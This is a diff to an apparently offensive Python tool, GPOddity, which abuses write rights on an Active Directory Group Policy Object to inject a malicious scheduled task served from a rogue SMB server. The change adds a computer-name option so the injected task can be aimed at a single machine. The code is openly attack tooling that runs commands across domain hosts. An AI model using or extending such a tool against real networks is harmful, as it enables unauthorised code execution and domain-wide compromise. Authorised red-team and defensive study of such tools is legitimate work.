@@ -30,6 +30,7 @@ def main(
         username: Annotated[str, typer.Option(help="The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$')", rich_help_panel="General options")],
 
         command: Annotated[str, typer.Option(help="The command that should be executed through the malicious GPO", rich_help_panel="Malicious Group Policy Template generation options")] = None,
+        computername: Annotated[str, typer.Option(help="Computer (NETBIOS name) to target with item-level targeting", rich_help_panel="Malicious Group Policy Template generation options")] = None,
         rogue_smbserver_ip: Annotated[str, typer.Option(help="The IP address or DNS name of the server that will host the spoofed malicious GPO. If using the GPOddity smb server, this should be the IP address of the current host on the internal network (for instance, 192.168.58.101)", rich_help_panel="Group Policy Template location spoofing options")] = None,
         rogue_smbserver_share: Annotated[str, typer.Option(help="The name of the share that will serve the spoofed malicious GPO (for instance, 'synacktiv'). If you are running the embedded SMB server, do NOT provide names including 'SYSVOL' or 'NETLOGON' (protected by UNC path hardening by default)", rich_help_panel="Group Policy Template location spoofing options")] = None,
 
@@ -148,7 +149,7 @@ def main(
     # Write malicious scheduled task
     logger.warning(f"[*] Injecting malicious scheduled task into initialized GPT")
     try:
-        write_scheduled_task(gpo_type, command, powershell)
+        write_scheduled_task(gpo_type, command, powershell, computername)
     except:
         logger.critical(f"[!] Failed to write malicious scheduled task to downloaded GPT. Exiting...", exc_info=True)
         sys.exit(1)
